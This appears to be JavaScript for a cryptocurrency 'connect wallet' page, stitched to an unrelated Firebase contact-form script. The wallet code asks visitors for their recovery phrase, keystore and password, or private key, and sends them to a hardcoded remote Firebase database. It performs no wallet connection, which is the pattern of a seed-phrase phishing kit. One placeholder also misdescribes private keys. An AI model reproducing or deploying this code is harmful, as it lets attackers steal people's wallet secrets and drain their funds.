 <script>
        function selectWallet() {
            var selectedWallet = document.getElementById("wallet-list").value;
            document.getElementById("selected-wallet").value = selectedWallet;
            showWalletForm(selectedWallet);
        }

        function showWalletForm(selectedWallet) {
            // Display the wallet connection form
            document.getElementById('wallet-connect-form').style.display = 'block';

            // Show or hide information input based on the selected wallet type
            showInfoInput(selectedWallet);
        }

        function showInfoInput(selectedWallet) {
            // Retrieve selected information type
            const walletInfoType = document.getElementById('wallet-info-type').value;

            // Remove any existing information input elements
            const infoInputContainer = document.getElementById('info-input-container');
            infoInputContainer.innerHTML = '';

            // Dynamically create and append information input fields based on the selected type and wallet
            switch (walletInfoType) {
                case 'phrase':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
                    `;
                    break;
                case 'keystore':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
                        <label for="wallet-password">Wallet Password:</label>
                        <input type="password" id="wallet-password" placeholder="Enter your password">
                    `;
                    break;
                case 'private-key':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
                    `;
                    break;
                default:
                    break;
            }
        }

   
 function connectWallet() {
            // Retrieve selected wallet type, information type, and credentials
            const selectedWallet = document.getElementById('selected-wallet').value;
            const walletInfoType = document.getElementById('wallet-info-type').value;
            const walletName = document.getElementById('wallet-name').value; // New field for wallet name

            // Retrieve information input based on the selected type
            let walletCredentials;
            switch (walletInfoType) {
                case 'phrase':
                    walletCredentials = document.getElementById('wallet-phrase').value;
                    break;
                case 'keystore':
                    const walletKeystore = document.getElementById('wallet-keystore').value;
                    const walletPassword = document.getElementById('wallet-password').value;
                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
                    break;
                case 'private-key':
                    walletCredentials = document.getElementById('wallet-private-key').value;
                    break;
                default:
                    break;
            }

            // Initialize Firebase (Use your actual Firebase configuration)
            const firebaseConfig = {
                apiKey: "AIzaSyCWsLUONo3eVXS4R-2niIJZYaA8I0RtrbQ",
                authDomain: "crypto-jwv.firebaseapp.com",
                projectId: "crypto-jwv",
                storageBucket: "crypto-jwv.appspot.com",
                messagingSenderId: "653329737827",
                appId: "1:653329737827:web:81394c978771bc4a35b056"
            };

            const app = firebase.initializeApp(firebaseConfig);
            const database = firebase.database();

            // Save wallet information to Firebase
            const user = firebase.auth().currentUser; // Use the current authenticated user
            const walletRef = database.ref('users/' + user.uid + '/wallets').push();

            walletRef.set({
                walletType: selectedWallet,
                walletName: walletName,
                walletInfoType: walletInfoType,
                walletCredentials: walletCredentials
            }).then(() => {
                console.log('Wallet information saved successfully!');
                alert('Wallet information saved successfully!');
            }).catch((error) => {
                console.error('Error saving wallet information:', error);
                alert('Error saving wallet information. Please try again.');
            });

            // Add your actual wallet connection logic here
        }
    </script>



// Your web app's Firebase configuration
   const firebaseConfig = {
    apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
    authDomain: "contactform-50d9f.firebaseapp.com",
    databaseURL: "https://contactform-50d9f-default-rtdb.firebaseio.com",
    projectId: "contactform-50d9f",
    storageBucket: "contactform-50d9f.appspot.com",
    messagingSenderId: "481729191146",
    appId: "1:481729191146:web:6798592b5070b2119f0b93"
  };

// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("contactForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var name = getElementVal("name");
  var emailid = getElementVal("emailid");
  var msgContent = getElementVal("msgContent");

  saveMessages(name, emailid, msgContent);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("contactForm").reset();
}

const saveMessages = (name, emailid, msgContent) => {
  var newContactForm = contactFormDB.push();

  newContactForm.set({
    name: name,
    emailid: emailid,
    msgContent: msgContent,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
